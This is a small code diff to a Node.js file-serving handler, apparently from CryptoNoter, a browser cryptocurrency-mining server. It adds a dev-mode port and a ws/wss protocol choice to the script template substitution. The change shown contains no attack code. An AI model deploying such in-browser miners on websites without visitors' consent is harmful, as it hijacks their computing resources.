@@ -31,7 +31,9 @@ const stats = (req, res) => {
             });
         } else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
-                buf = buf.toString().replace(/%CryptoNoter_domain%/g, `${conf.domain}`);
+                buf = buf.toString()
+                    .replace(/%CryptoNoter_domain%/g, `${conf.domain}${conf.dev?`:${conf.lport}`:''}`)
+                    .replace(/%ws_protocol%/g, `${conf.dev?'ws':'wss'}`);
                 if (req.url.match(/\.js$/)) {
                     res.setHeader('content-type', 'application/javascript');
                 }
